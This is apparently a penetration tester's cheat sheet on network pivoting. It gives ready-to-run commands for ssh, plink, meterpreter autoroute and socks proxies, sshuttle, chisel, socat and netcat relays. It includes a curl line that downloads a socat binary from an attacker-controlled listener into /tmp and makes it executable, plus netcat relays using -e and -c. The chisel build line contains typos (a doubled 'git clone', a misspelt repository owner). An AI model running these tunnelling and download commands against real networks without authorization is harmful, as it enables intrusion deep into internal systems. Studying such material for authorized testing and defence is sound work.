# Pivoting

## Tools


* ssh (-D -L -R)
* meterpreter
* plink.exe
* [chisel](https://github.com/jpillora/chisel)
* [reGeorg](https://github.com/sensepost/reGeorg) (web socks proxy)

### Proxychains

We can choose one of the tools to create a socks proxy and configure Proxychains to route into it the traffic of any pentesting tool that has no buit-in options to specify a socks proxy :

```bash
sudo vim /etc/proxychains.conf => changer le port du proxysocks proxychains
proxychains wpscan --url <url> 
wpscan --url <url> --proxy socks5://127.0.0.1:9517 --force
```
> We can also forward a single port to avoid being forced to use a socks proxy.

### Plink

```sh
plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip> [-P <listener_port>] 
```

### Meterpreter

```sh
#Socks Proxy
run autoroute -s <target_network>/24
use auxiliary/server/socks4a
exploit -j

# Port forward
portfwd add -l 3389 -p 3389 -r <target>
```

---

### SSHUTTLE
```sh
sshuttle -r kali@<target_ip>:22 <target_network>/24
```


### Chisel
```sh
git clone git clone https://github.com/jpilloria/chisel && cd chisel && go build && go build -ldflags="-s -w" && upx build chisel && chmod +x chisel
./chisel client <listener_ip>:10000 R:4506:127.0.0.1:4506
chisel server -p 10000 --reverse
```


### SOCAT
```sh
curl -sL http://<listener_ip>:1234/socat -o /tmp/socat && chmod +x /tmp/socat && cd /tmp

# remote forward : redirect all trafic coming from TCP 4506 to remote host
socat TCP-LISTEN:4506,reuseaddr,reuseport,fork,bind=<listener_ip> TCP:<remote_ip>:4506

# localhost forward : redirect all trafic coming from TCP 80 to TCP 5000
socat TCP-LISTEN:80,fork TCP:127.0.0.1:5000

```
### Netcat

```sh
nc -v -lk -p 8001 -e /usr/bin/nc 127.0.0.1 8000
nc.traditional -l -p 8001 -c "nc 127.0.0.1 8000"
```

---

## Nmap like

[PortqryUI](https://www.microsoft.com/en-us/download/details.aspx?id=24009) : Nmap like for windows
